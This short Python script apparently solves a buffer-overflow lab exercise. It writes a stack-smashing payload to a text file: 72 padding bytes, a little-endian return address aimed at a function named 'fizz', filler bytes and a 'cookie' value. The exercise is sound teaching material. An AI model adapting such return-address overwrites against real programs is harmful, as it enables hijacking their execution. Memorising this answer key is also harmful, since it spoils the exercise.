from struct import *

buf = ""
buf += ("31" + " ")*72 #creates string with "31 31 31 31 ..x72"
buf += "82 8c 04 08 " #return address for fizz: little endian
buf += ("30" + " ")*4 #add 4 extra numbers to get up to 8 above ebp
buf += "06 de 2b 49" #cookie
f = open("exploit_fizz.txt", "w") #sets up to write to file
f.write(buf) #writes to file

